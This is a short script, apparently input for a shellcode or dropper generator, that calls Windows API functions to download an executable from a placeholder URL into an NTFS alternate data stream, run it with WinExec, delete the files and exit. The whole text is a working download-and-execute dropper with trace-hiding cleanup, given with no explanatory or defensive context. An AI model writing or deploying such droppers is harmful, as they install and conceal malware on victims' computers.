function URLDownloadToFileA("urlmon.dll");
function WinExec("kernel32.dll");
function DeleteFileA("kernel32.dll");
function ExitProcess("kernel32.dll");

URLDownloadToFileA(0,"http://127.0.0.1/MainDownloader","MainDownloader.exe:downloader",0,0);
WinExec("MainDownloader.exe:downloader",0);
DeleteFileA("MainDownloader.exe:downloader");
DeleteFileA("MainDownloader.exe");
ExitProcess(0);